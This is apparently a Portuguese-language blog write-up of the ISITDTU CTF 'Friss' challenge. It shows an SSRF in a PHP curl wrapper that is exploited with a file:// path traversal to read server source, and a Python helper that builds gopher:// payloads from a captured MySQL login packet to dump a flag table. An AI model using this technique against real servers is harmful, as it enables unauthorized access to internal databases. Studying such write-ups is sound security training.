<!doctype html>

<html lang="en">
<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="songroger">

  <title>ISITDTU CTF Friss - Writeup</title>

  <meta name="description" content="&lt;p&gt;Está challenge aconteceu este final de semana e eu gostei muito da resolução dela, e também consegui um first blood aqui :) &lt;/p&gt;&lt;img src=&q...">

  <!-- Open graph data -->
  <meta property="og:site_name" content="m<>4k'4"br0">
  <meta property="og:title" content="ISITDTU CTF Friss - Writeup">
  <meta property="og:url" content="http://localhost:4000/isitdtu-writeup/">
  <meta property="og:type" content="article">
  <meta property="og:description" content="&lt;p&gt;Está challenge aconteceu este final de semana e eu gostei muito da resolução dela, e também consegui um first blood aqui :) &lt;/p&gt;&lt;img src=&q...">

  <!-- Standard Stuff -->
  <link rel="canonical" href="http://localhost:4000/isitdtu-writeup/"/>
  <link rel="alternate" type="application/rss+xml" title="m<>4k'4"br0" href="http://localhost:4000/feed.xml"/>

  <!-- Favicons -->
  <link rel="shortcut icon" href="">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-config" content="/assets/browserconfig.xml">
  <meta name="theme-color" content="#ffffff">

  <!-- Styles -->
  
    <style type="text/css">
      ::selection {
    background: #1565c0;
    color: #fff;
    text-shadow: none
}

html {
    font-size: 109.375%;
    -moz-osx-font-smoothing: grayscale;
    -webkit-font-smoothing: antialiased;
    font-smoothing: antialiased;
    text-size-adjust: 100%;
    box-sizing: border-box
}

@media screen and (min-width:700px) {
    html {
        font-size: 125%
    }
}

@media screen and (min-width:1440px) {
    html {
        font-size: 140.625%
    }
}

*,
:after,
:before {
    margin: 0;
    padding: 0;
    box-sizing: inherit
}

body {
    color: #444;
    font-family: Georgia, Source Sans Pro, sans-serif;
    font-size: .9rem;
    line-height: 1.6rem
}

img {
    display: block;
    max-width: 100%;
    height: auto;
    border: 0
}

a:active,
a:hover,
a:visited {
    color: #444;
    text-decoration: none
}

strong {
    font-weight: 700
}

em {
    font-style: italic
}

a {
    background: transparent;
    color: #1565c0;
    text-decoration: none;
    cursor: pointer;
    word-wrap: break-word
}

a:active,
a:focus,
a:hover {
    outline: 0;
    text-decoration: none
}

h1,
h2,
h3,
h4,
h5,
h6,
p {
    margin-bottom: .2rem
}

h1,
h2,
h3,
h4,
h5,
h6 {
    color: #000;
    font-weight: 700;
    vertical-align: middle
}

.cdf{
    width: 13px;
    vertical-align: middle;
    filter: invert(28%) sepia(0%) saturate(1347%) hue-rotate(218deg) brightness(87%) contrast(92%);
    display: initial;
}
h1:not(:first-child),
h2:not(:first-child),
h3:not(:first-child),
h4:not(:first-child),
h5:not(:first-child),
h6:not(:first-child) {
    margin-top: 2.4rem
}

h1 {
    font-size: 2rem;
    line-height: 3.2rem
}

h2 {
    font-size: 1.5rem;
    line-height: 2.4rem
}

h3 {
    font-size: 1.17rem
}

h4 {
    font-size: 1rem
}

h5 {
    font-size: .707rem
}

h6 {
    font-size: .5rem
}

ol,
ul {
    margin: 0 0 1.6rem 1.6rem
}

ol ol,
ol ul,
ul ol,
ul ul {
    margin: 0 1.6rem
}

hr {
    display: block;
    height: 1.6rem;
    border: 0;
    box-shadow: inset 0 1px 0 #eee
}

blockquote {
    margin-bottom: 1.6rem;
    padding: 1.6rem;
    border-left: 4px solid #e6e6e6;
    background: #f7f7f7
}

blockquote p {
    margin: 0
}

.col {
    max-width: calc(700px + 1.6rem);
    margin: 0 auto;
    padding: 0 .8rem
}

@media screen and (min-width:1440px) {
    .col {
        max-width: calc(800px + 1.6rem)
    }
}

.header {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-around;
    margin-bottom: 2rem;
    box-shadow: 0 1px 0 0 #eee
}

@media screen and (min-width:734px) {
    .header {
        font-size: .75rem
    }
}

.header__logo {
    margin-bottom: 0;
    font-size: 1rem;
    font-weight: 400;
    line-height: 1.6rem
}

.header__logo img {
    display: initial;
    width: 30px;
    height: 30px;
    vertical-align: middle;
    border-radius: 15px;
    opacity: 1
}

.header__logo img:hover {
    opacity: .5;
    transition: all .5s ease-in
}

.header__logo a {
    color: #999;
    text-transform: uppercase
}

@media screen and (min-width:734px) {
    .header__logo {
        font-size: .75rem
    }
}

.header__nav {
    display: flex;
    flex-wrap: wrap
}

.header__nav a {
    color: #444
}

.header__nav a:hover {
    color: #999;
    transition: all .5s ease-in
}

.header__link {
    padding: .8rem;
    color: #444;
    text-decoration: none;
    border-bottom: 2px solid transparent;
    padding-bottom: 1px
}

.header__link:hover {
    transition: all .5s ease-in;
    border-color: hsla(34, 5%, 70%, .7)
}

.header__link--logo {
    padding: .8rem;
    display: block
}

.header__link--logo:focus,
.header__link--logo:hover {
    color: #444;
    transition: all .5s ease-in
}

.footer {
    margin-top: .5rem;
    padding: 1.6rem 0;
    box-shadow: inset 0 1px 0 #eee
}

.footer .col {
    font-size: 13px;
    text-align: center
}

.subscribe {
    color: #999;
    transition: all .25s ease-in
}

.subscribe:hover {
    color: #444;
    text-decoration: none
}

.blocks {
    display: flex;
    align-items: center;
    margin-bottom: .1rem
}

.blocks--space {
    justify-content: space-between
}

.block__item--mr {
    margin-right: .8rem
}

.blocks__item a {
    text-decoration: none;
    color: #999;
    border: 3px solid rgba(0, 0, 0, .1);
    border-radius: 20px;
    padding: 1px 15px;
    font-family: Georgia, Microsoft YaHei, sans-serif
}

.blocks__item a:hover {
    color: #444;
    border-color: #999;
    transition: all .5s ease-in
}

.blocks__item .btn {
    box-shadow: inset 0 0 0 0 #1565c0
}

.article {
    margin-bottom: 3rem;
    animation: itemshow .9s linear
}

.article__title {
    margin-bottom: .8rem
}

.article__title--single,
.article__title a {
    font-family: Georgia, Microsoft YaHei, sans-serif
}

.article__title a {
    color: #444;
    transition: all .25s ease-in
}

.article__title a:hover {
    color: #999;
    text-decoration: none
}

.article__date {
    display: block;
    margin-bottom: .8rem;
    font-size: .7501rem
}

.cover {
    margin-bottom: .5rem
}

.cover img {
    width: 100%
}

.article__more {
    color: #999;
    text-decoration: none
}

.article__more:hover {
    transition: all .5s ease-in;
    color: #444;
    text-decoration: none
}

.post-tags {
    text-align: right;
    text-decoration: none;
    font: italic 700 12px/30px Georgia, serif
}

.post-tags a {
    color: #999
}

.post-tags a:hover {
    color: #444;
    text-decoration: none
}

@-webkit-keyframes 'itemshow' {
    0% {
        top: -60px;
        opacity: 0
    }

    33% {
        top: -40px;
        opacity: .2
    }

    66% {
        top: -20px;
        opacity: .6
    }

    to {
        top: 0;
        opacity: 1
    }
}

@keyframes 'itemshow' {
    0% {
        top: -60px;
        opacity: 0
    }

    33% {
        top: -40px;
        opacity: .2
    }

    66% {
        top: -20px;
        opacity: .6
    }

    to {
        top: 0;
        opacity: 1
    }
}

.arch-item {
    margin-bottom: 10px;
    animation: itemshow .9s linear
}

.arch-title {
    color: #444;
    font-size: 20px;
    font-family: Georgia, Hiragino Sans GB, Microsoft YaHei, sans-serif;
    font-weight: 700;
    padding-right: 10px
}

.arch-title:hover {
    color: #999;
    transition: all .25s ease-in
}

time {
    font-size: 15px;
    font-family: Optima, Helvetica Neue, sans-serif
}

.arch-desc,
time {
    color: #999
}

code,
pre {
    background: #f7f7f7;
    font-family: Source Code Pro, monospace;
    font-size: .847rem;
    overflow-x: auto;
    vertical-align: top
}

.highlight {
    margin-bottom: 1.6rem;
    padding: .8rem;
    background: #f7f7f7;
    box-shadow: inset 0 0 0 1px #eee
}

.highlight .c {
    color: #998
}

.highlight .err {
    background-color: #e3d2d2;
    color: #a61717
}

.highlight .k,
.highlight .o {
    font-weight: 400
}

.highlight .cm {
    color: #998
}

.highlight .cp {
    color: #999;
    font-weight: 400
}

.highlight .c1 {
    color: #998
}

.highlight .cs {
    color: #999;
    font-weight: 400
}

.highlight .gd {
    background-color: #fdd;
    color: #000
}

.highlight .gd .x {
    background-color: #faa;
    color: #000
}

.highlight .gr {
    color: #a00
}

.highlight .gh {
    color: #999
}

.highlight .gi {
    background-color: #dfd;
    color: #000
}

.highlight .gi .x {
    background-color: #afa;
    color: #000
}

.highlight .go {
    color: #888
}

.highlight .gp {
    color: #555
}

.highlight .gs {
    font-weight: 400
}

.highlight .gu {
    color: #aaa
}

.highlight .gt {
    color: #a00
}

.highlight .kc,
.highlight .kd,
.highlight .kp,
.highlight .kr,
.highlight .kt {
    font-weight: 400
}

.highlight .kt {
    color: #458
}

.highlight .m {
    color: #099
}

.highlight .s {
    color: #d14
}

.highlight .na {
    color: teal
}

.highlight .nb {
    color: #0086b3
}

.highlight .nc {
    color: #458;
    font-weight: 400
}

.highlight .no {
    color: teal
}

.highlight .ni {
    color: purple
}

.highlight .ne,
.highlight .nf {
    color: #900;
    font-weight: 400
}

.highlight .nn {
    color: #555
}

.highlight .nt {
    color: navy
}

.highlight .nv {
    color: teal
}

.highlight .ow {
    font-weight: 400
}

.highlight .w {
    color: #bbb
}

.highlight .mf,
.highlight .mh,
.highlight .mi,
.highlight .mo {
    color: #099
}

.highlight .s2,
.highlight .sb,
.highlight .sc,
.highlight .sd,
.highlight .se,
.highlight .sh,
.highlight .si,
.highlight .sx {
    color: #d14
}

.highlight .sr {
    color: #009926
}

.highlight .s1 {
    color: #d14
}

.highlight .ss {
    color: #990073
}

.highlight .bp {
    color: #999
}

.highlight .vc,
.highlight .vg,
.highlight .vi {
    color: teal
}

.highlight .il {
    color: #099
}
    </style>
  


</head>

<body>

  <header class="header">

    
      <h1 class="header__logo">
        <a href="/" class="header__link--logo">m<>4k'4"br0</a>
      </h1>
    

    <nav class="header__nav" role="navigation">      
      <a href="/archive/" class="header__link">Archive</a>
      <!-- <a href="http://github.com/m4k4br0" class="header__link" target="_blank">Github</a> -->
      <a href="/about/" class="header__link">About</a>
    </nav>
  </header>

  <main class="col">


<article class="article">
  <h2 class="article__title article__title--single">ISITDTU CTF Friss - Writeup</h2>
  <time class="article__date" datetime="2018-07-28"> 00:00 Jul.28-2018</time>
  
  <p>Está challenge aconteceu este final de semana e eu gostei muito da resolução dela, e também consegui um first blood aqui :) </p>
<img src="https://i.imgur.com/xpiQ4x4.png">
<br>
<img src="https://i.imgur.com/BKL98LX.png">

<p>Bem, entrando na challenge não tínhamos muita coisa para fazer, haviamos um input e um botão, basicamente indicando que tínhamos um curl sendo executado, a primeira coisa que tentei, foi tentar enviar algo para o google.com e ver se retornava algum valor:</p>
<img src="https://i.imgur.com/x44sNn7.png">
<img src="https://i.imgur.com/6qpAlUX.png">
<p>Bem, parece que só podemos enviar coisas para o localhost, então, indo um pouco a fundo, podemos achar um pequeno bypass para isso, já que a aplicação não está barrando wrappers, temos a possibilidade de utilizar o file:// aqui:</p>
<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="n">php</span> <span class="o">&gt;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">parse_url</span><span class="p">(</span><span class="s1">'file://localhost/../var/www/html/index.php"'</span><span class="p">));</span>
<span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">[</span><span class="s2">"scheme"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nf">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">"file"</span>
  <span class="p">[</span><span class="s2">"host"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nf">string</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="s2">"localhost"</span>
  <span class="p">[</span><span class="s2">"path"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nf">string</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span> <span class="s2">"/../var/www/html/index.php""
}</span></code></pre></figure>
<br>
<img src="https://i.imgur.com/knlEmbs.png">
<br>
<img src="https://i.imgur.com/K6IYvF2.png">
<br>
Ok, conseguimos o código da index, vamos dar uma olhada nele:
<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">include_once</span> <span class="s2">"config.php"</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]))</span>
<span class="p">{</span>
	<span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">];</span>
	<span class="nv">$content_url</span> <span class="o">=</span> <span class="nf">getUrlContent</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
	<span class="nv">$content_url</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">]))</span>
<span class="p">{</span>
	<span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>
<br>
<p>Aqui não tem muito o que analisar, pois a função getUrlContent() está vindo muito provavelmente do config.php:</p>
<br>
<img src="https://i.imgur.com/btOBq77.png">
<p>Aqui sim, temos o que analisar:</p>
<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nv">$hosts</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$dbusername</span> <span class="o">=</span> <span class="s2">"ssrf_user"</span><span class="p">;</span>
<span class="nv">$dbpasswd</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"ssrf"</span><span class="p">;</span>
<span class="nv">$dbport</span> <span class="o">=</span> <span class="mi">3306</span><span class="p">;</span>

<span class="nv">$conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="nv">$hosts</span><span class="p">,</span><span class="nv">$dbusername</span><span class="p">,</span><span class="nv">$dbpasswd</span><span class="p">,</span><span class="nv">$dbname</span><span class="p">,</span><span class="nv">$dbport</span><span class="p">);</span>

<span class="k">function</span> <span class="n">initdb</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span>
<span class="p">{</span>
	<span class="nv">$dbinit</span> <span class="o">=</span> <span class="s2">"create table if not exists flag(secret varchar(100));"</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$dbinit</span><span class="p">))</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="k">else</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
<span class="p">{</span>
	<span class="nv">$tmpurl</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$tmpurl</span> <span class="o">!=</span> <span class="s2">"localhost"</span> <span class="k">and</span> <span class="nv">$tmpurl</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$tmpurl</span><span class="p">);</span>
		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nv">$url</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">getUrlContent</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
	<span class="nv">$url</span> <span class="o">=</span> <span class="nf">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
	<span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
	<span class="nv">$pl</span> <span class="o">=</span> <span class="s2">"curl "</span><span class="mf">.</span><span class="nv">$url</span><span class="p">;</span>
	<span class="k">echo</span> <span class="nv">$pl</span><span class="p">;</span>
	<span class="nv">$content</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$pl</span><span class="p">);</span>
	<span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
<span class="p">}</span>
<span class="nf">initdb</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
<span class="cp">?&gt;</span></code></pre></figure>
<p>É sempre interessante quando temos usuarios,senhas e etc presentes no código, vamos guardar, pois pode nos ser utíl futuramente.</p>
<p>Analisando o initdb() você consegue ver que a função está criando uma tabela chamada flag com uma coluna secret no banco de dados, caso ela ainda não exista...</p>

<br>
<p>A função safe() está pegando a url passada e verificando via parse_url() se o host bate com localhost ou 127.0.0.1, nenhuma verificação pesada aqui...</p>
<p>Bem, aqui no getUrlContent() eu confesso que cheguei a pensar que havia, talvez, uma nova de bypassar o escapeshellarg e conseguir injetar comandos, porém, não faria sentido algum isso, mas eu pensei nessa possibilidade e perdi muito tempo com isso…</p>
<p>Olhando para a função, conseguimos ver que ela está usando o escapeshellarg para criar um escape nos argumentos do comando, logo abaixo é executado um shell_exec e retornado para o usuário.</p>

<p>Ok, pensando nas possibilidades, ficou muito claro que eu deveria persistir no ssrf, e talvez encontrar algum protocolo disponível do qual eu conseguisse me aproveitar para conseguir uma shell talvez, então tentei ftp://,ssh://,dict:// e então gopher://…</p>

<img src="https://i.imgur.com/tSg37dR.png">
<p>Eu já havia estudado diversas vezes em formas de conseguir shell com o gopher, usando redis ou fastcgi em conjunto, mas nunca havia feito com mysql, encontrei alguns artigos que me indicaram que uma parte do formato do pacote do mysql, quando enviado na pilha tcp, seria o formato que o mysql entenderia caso pudessemos envia-lo por uma url, bem, é muito abstrato falar assim, vamos ver como isso funciona na prática, porém, antes, vamos criar um usuário igual ao do desafio “ssrf_user” em nosso mysql…</p>

<pre>
mysql> CREATE USER 'ssrf_user'@'localhost';
Query OK, 0 rows affected (0,07 sec)

mysql> GRANT USAGE ON *.* TO 'ssrf_user'@'localhost';
Query OK, 0 rows affected (0,01 sec)

mysql> GRANT ALL PRIVILEGES *.* TO 'ssrf_user'@'localhost';
Query OK, 0 rows affected (0,10 sec)
</pre>
<br>
<p>Ok, agora podemos prosseguir melhor.</p>
<p>Vamos abrir o wireshark para ver como o protocolo vai se comportar quando enviarmos um pacote de conexão e login para o mysql:</p>
<img src="https://i.imgur.com/e2pjxmm.png">
<p>Eu cheguei a fazer o login pelo mac, mas percebi que o mysql do mac estava gerando de uma forma totalmente diferente da original o pacote de conexão, ele estava grande demais para apenas um login, então, abri um ubuntu com mysql e um wireshark para testar isso, mas basicamente o que precisamos selecionar é o último segmento apresentado do pacote pelo wireshark, que é só a parte do pacote que a gente faz a tentativa de login:</p>
<img src="https://i.imgur.com/d2lTn7s.png">
<br>
<p>A gente basicamente pode dividir essa comunicação do pacote do mysql e duas partes, a parte da conexão e a parte da execução dos comandos, aqui estamos apenas na parte da conexão.</p>
<img src="https://i.imgur.com/zMvBS7c.png">

<p>A partir daqui, precisamos fazer isso virar uma url, e a forma mais fácil de fazer isso, é usar o input do “Show and save data as” e setar ele para “Raw”:</p>
<img src="https://i.imgur.com/bV97KbV.png">
<p>Ok, agora, precisamos encodar isso tudo em um formato adequado para a url, na verdade não é muito difícil, bastaria adicionar % a cada dois bytes, mas eu encontrei um script que faz isso para nós:</p>
<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">result</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
  <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="mi">2</span><span class="p">)]</span>
  <span class="k">return</span> <span class="s">"curl gopher://127.0.0.1:3306/_%"</span> <span class="o">+</span> <span class="s">"%"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
  <span class="kn">import</span> <span class="nn">sys</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="k">print</span> <span class="n">result</span><span class="p">(</span><span class="n">s</span><span class="p">)</span></code></pre></figure>
<br>
<img src="https://i.imgur.com/Gie5b2C.png">
<img src="https://i.imgur.com/mJxrJjh.png">
<p>Parece que funcionou, bem, mas como já haviamos visto antes, é criado um banco de dados com uma tabela flag com uma coluna secret, então, vamos dumpar ela com o gopher…</p>
<br>
<p>Vamos mudar o nosso comando de login agora, para mysql -h 127.0.0.1 -u ssrf_user -e “use ssrf; select secret from flag"</p>
<img src="https://i.imgur.com/CTDdkpI.png">
<p>Olhando neste novo pacote, a gente consegue até ver a query que será executada…</p>
<br>
<p>depois de refazer o processo inteiro em cima deste novo pacote, conseguimos enfim a flag!</p>
<img src="https://i.imgur.com/lxvxX7Y.png">
<img src="https://i.imgur.com/jA991Ma.png">

  
</article>




<footer class="footer">
	<div class="col">
		© 2018 m<>4k'4"br0 | <a href="/feed.xml" class="subscribe">RSS</a>
	</div>
</footer>

<script type="text/javascript">
  //友盟统计
  var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
  document.write(unescape("%3Cspan style='display:none;' id='cnzz_stat_icon_1260641879'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1260641879' type='text/javascript'%3E%3C/script%3E"));
</script>
</body>
</html>
